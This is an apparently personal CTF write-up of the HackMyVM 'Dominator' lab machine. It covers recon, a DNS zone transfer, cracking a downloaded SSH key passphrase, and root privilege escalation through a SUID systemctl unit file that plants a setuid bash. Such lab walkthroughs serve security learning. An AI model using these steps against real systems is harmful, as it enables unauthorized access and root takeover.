---
title: "Dominator"
author: am-a-circle
date: 2022-02-14 15:04:00 +0800
categories: [hackmyvm,easyy]
tags: [DNS,systemctl]
math: false
mermaid: false
---

## Overview


|Box Difficulty| Link|
|--|--|
| Easy | [hackmyvm Link](https://hackmyvm.eu/machines/machine.php?vm=Dominator) |

## Recon

TCP Ports:
```bash
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# masscan -p1-65535,U:1-65535 192.168.56.53 --rate=1000  
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-02-14 04:09:07 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 53/udp on 192.168.56.53                                   
Discovered open port 53/tcp on 192.168.56.53                                   
Discovered open port 65222/tcp on 192.168.56.53                                
Discovered open port 80/tcp on 192.168.56.53  
```

UDP Ports:
```bash
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# nmap -sUV -T4 -F --version-intensity 0 192.168.56.53

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 23:10 EST
Warning: 192.168.56.53 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.56.53
Host is up (0.0034s latency).
Not shown: 55 closed udp ports (port-unreach), 44 open|filtered udp ports (no-response)
PORT   STATE SERVICE VERSION
53/udp open  domain  (unknown banner: not currently available)
MAC Address: 08:00:27:9B:F4:CF (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.95 seconds

```

Enumerate ports that were found to be open:
```bash
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# nmap -sVC -Pn -p 53,80,65222 192.168.56.53 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 23:12 EST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 23:12 (0:00:12 remaining)
Nmap scan report for 192.168.56.53
Host is up (0.0039s latency).

PORT      STATE SERVICE VERSION
53/tcp    open  domain  (unknown banner: not currently available)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    currently available
| dns-nsid: 
|_  bind.version: not currently available
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
65222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)
|   256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)
|_  256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:b1:1c:36:6d:75 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.92%I=7%D=2/13%Time=6209D6C1%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,52,"\0P\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x18\x17not\x20curren
SF:tly\x20available\xc0\x0c\0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
MAC Address: 08:00:27:9B:F4:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.21 seconds
```

Port 53, DNS
Port 80, HTTP
Port 65222 , SSH

Begin enumeration on these ports

## HTTP- TCP 80

```bash
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# gobuster dir -u http://192.168.56.53 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,jsp" -o gobuster_p80.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.53 
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,jsp,txt,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/02/13 23:09:46 Starting gobuster in directory enumeration mode
===============================================================
http://192.168.56.53/index.html           (Status: 200) [Size: 10701]
http://192.168.56.53/robots.txt           (Status: 200) [Size: 14]   
http://192.168.56.53/server-status        (Status: 403) [Size: 278]  
```
Found a domain in robots.txt

```bash
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# curl http://192.168.56.53/robots.txt
dominator.hmv
```

## DNS- TCP 53

`secret.dominator.hmv.   604800  IN      TXT     "/fhcrefrperg"` found in DNS zone transfer.

1

```bash
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# dig axfr @192.168.56.53 dominator.hmv  

; <<>> DiG 9.17.21-1-Debian <<>> axfr @192.168.56.53 dominator.hmv
; (1 server found)
;; global options: +cmd
dominator.hmv.          604800  IN      SOA     ns1.dominator.hmv. root.dominator.hmv. 2 604800 86400 2419200 604800
dominator.hmv.          604800  IN      NS      ns1.dominator.hmv.
admin.dominator.hmv.    604800  IN      A       192.168.0.12
ns1.dominator.hmv.      604800  IN      A       127.0.0.1
secret.dominator.hmv.   604800  IN      TXT     "/fhcrefrperg"
www.dominator.hmv.      604800  IN      A       192.168.0.11
dominator.hmv.          604800  IN      SOA     ns1.dominator.hmv. root.dominator.hmv. 2 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 192.168.56.53#53(192.168.56.53) (TCP)
;; WHEN: Sun Feb 13 23:20:18 EST 2022
;; XFR size: 7 records (messages 1, bytes 255)
```

## Shell as Hans

Find what possible cipher it is:
![enter image description here](https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/hackmyvm/dominator/dominator1.png?raw=true)
From there determine it is rot13 and the decrypted text is `/supersecret`
![enter image description here](https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/hackmyvm/dominator/dominator2.png?raw=true)
Contains private key of hans:
![enter image description here](https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/hackmyvm/dominator/dominator3.png?raw=true)

```bash
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# wget http://dominator.hmv/supersecret/hans_key
--2022-02-14 00:46:32--  http://dominator.hmv/supersecret/hans_key
Resolving dominator.hmv (dominator.hmv)... 192.168.56.53
Connecting to dominator.hmv (dominator.hmv)|192.168.56.53|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1743 (1.7K)
Saving to: ‘hans_key’

hans_key                                          100%[===========================================================================================================>]   1.70K  --.-KB/s    in 0s      

2022-02-14 00:46:32 (610 MB/s) - ‘hans_key’ saved [1743/1743]


┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# locate ssh2john                   
/usr/share/john/ssh2john.py
/usr/share/john/__pycache__/ssh2john.cpython-39.pyc
                                                                                                                                                                                                      
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# /usr/share/john/ssh2john.py hans_key > id_rsa.hans
                                                                                                                                                                                                      
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hans 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
angels           (hans_key)     
1g 0:00:00:00 DONE (2022-02-14 00:45) 100.0g/s 6400p/s 6400c/s 6400C/s purple..charlie
Use the "--show" option to display all of the cracked passwords reliably
Session completed

┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# chmod 600 hans_key 
                                                                                                                                                                                                      
┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# ssh-keygen -y -f hans_key         
Enter passphrase: 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCw+kbLGx/49/GrtXgePBXbkJXI+G1kW/bF9bVAGyqOYClUgiVhA5lvSc1s5buScq4ppMB9cYnRtrHQ39SUbDP0j1525BpuDJjtkP1a4qi4wPPSgYrb0KAA7DEzTnXzQVzAbx+agQZvs/wa9rckBdSZbCAQBOKz+17iFcak4oCOHhkiGdbNjv7ThUAcMNpKCSQaTLwbktZuvh/BxObZXL6lUsqxNmo8BeifC44uKCwTPw2RRNAeVoTtCshWHSvlGI6HY6hCz335hX6CTy+mNQEB4tky13YqukXSKe31iO631vQd99F4+TrUVVGaSO84vTy0FKyhVZAVxDr6UviNOk91

┌──(root💀kali)-[/opt/hackmyv/dominator]
└─# ssh -i hans_key hans@192.168.56.53 -p 65222
Enter passphrase for key 'hans_key': 
Linux Dominator 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

             . . .                         
              \|/                          
            `--+--'                        
              /|\                          
             ' | '                         
               |                           
               |                           
           ,--'#`--.                       
           |#######|                       
        _.-'#######`-._                    
     ,-'###############`-.                 
   ,'#####################`,               
  /#########################\              
 |###########################|             
|#############################|            
|#############################|            
|#############################|            
|#############################|            
 |###########################|             
  \#########################/              
   `.#####################,'               
     `._###############_,'                 
        `--..#####..--'
      ___       __   __         ___ 
|  | |__  |    /  ` /  \  |\/| |__  
|/\| |___ |___ \__, \__/  |  | |___ 

hans@Dominator:/home$ cd hans/
hans@Dominator:~$ ls -la
total 36
drwxr-xr-x 4 hans hans 4096 ene 10  2021 .
drwxr-xr-x 3 root root 4096 ene  9  2021 ..
-rw------- 1 hans hans    1 ene 10  2021 .bash_history
-rw-r--r-- 1 hans hans  220 ene  9  2021 .bash_logout
-rw-r--r-- 1 hans hans 3526 ene  9  2021 .bashrc
drwxr-xr-x 3 hans hans 4096 ene  9  2021 .local
-rw-r--r-- 1 hans hans   83 ene 10  2021 note
-rw-r--r-- 1 hans hans  807 ene  9  2021 .profile
drwxr-xr-x 2 hans hans 4096 ene  9  2021 .ssh
hans@Dominator:~$ cat note 

the flag "user.txt" was removed .. maybe it's in the trash or maybe not ..

@_@
hans@Dominator:~$ find . -name "user*"
./.local/share/Trash/files/user.txt
./.local/share/Trash/info/user.txt.trashinfo

```

## Shell as Root
linpeas highlighted `/usr/bin/systemctl` !


```bash
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                                                         
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                                               
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                         
strings Not Found                                                                                                                                                                                     
strace Not Found                                                                                                                                                                                      
-rwsr-xr-x 1 root root        10K mar 28  2017 /usr/lib/eject/dmcrypt-get-device                                                                                                                      
-rwsr-xr-x 1 root root        63K jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                         
-rwsr-xr-x 1 root root        44K jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20                                                                                                                     
-rwsr-xr-x 1 root root        83K jul 27  2018 /usr/bin/gpasswd                                                                                                                                       
-rwsr-xr-x 1 root root        44K jul 27  2018 /usr/bin/chsh                                                                                                                                          
-rwsr-xr-x 1 root root        53K jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10                                                                                                                       
-rwsr-xr-x 1 root root        35K ene 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)                                                                                                              
-rwsr-xr-x 1 root root        63K ene 10  2019 /usr/bin/su                                                                                                                                            
-rwsr-xr-x 1 root root        51K ene 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                    
-rwsr-xr-x 1 root root       427K ene 31  2020 /usr/lib/openssh/ssh-keysign                                                                                                                           
-rwsr-xr-- 1 root messagebus  50K jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root       853K oct 24  2020 /usr/bin/systemctl
```

To exploit:
```bash
hans@Dominator:~$ nano /tmp/temp.service 
hans@Dominator:~$ cat /tmp/temp.service 
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /bin/bash /tmp/bash2 && chmod u+s /tmp/bash2"
[Install]
WantedBy=multi-user.target
hans@Dominator:~$ /usr/bin/systemctl link /tmp/temp.service 
hans@Dominator:~$ /usr/bin/systemctl enable --now /tmp/temp.service
hans@Dominator:~$ ls -la /tmp/
total 1512
drwxrwxrwt  9 root root    4096 feb 14 07:29 .
drwxr-xr-x 18 root root    4096 ene  9  2021 ..
-rwsrwxrwx  1 root root 1168776 feb 14 07:29 bash2
drwxrwxrwt  2 root root    4096 feb 14 05:08 .font-unix
drwxrwxrwt  2 root root    4096 feb 14 05:08 .ICE-unix
-rw-r--r--  1 hans hans  330173 abr 11  2021 linpeas.sh
-rw-r--r--  1 hans hans      39 feb 14 07:26 output
drwx------  3 root root    4096 feb 14 05:08 systemd-private-58c95b209f4843c199a4313bdf9cc9c7-apache2.service-UMq0nX
drwx------  3 root root    4096 feb 14 05:08 systemd-private-58c95b209f4843c199a4313bdf9cc9c7-systemd-timesyncd.service-e1aMXK
-rw-r--r--  1 hans hans     131 feb 14 07:29 temp.service
drwxrwxrwt  2 root root    4096 feb 14 05:08 .Test-unix
drwxrwxrwt  2 root root    4096 feb 14 05:08 .X11-unix
drwxrwxrwt  2 root root    4096 feb 14 05:08 .XIM-unix
hans@Dominator:~$ /tmp/bash2 -p
bash2-5.0# whoami
root
```
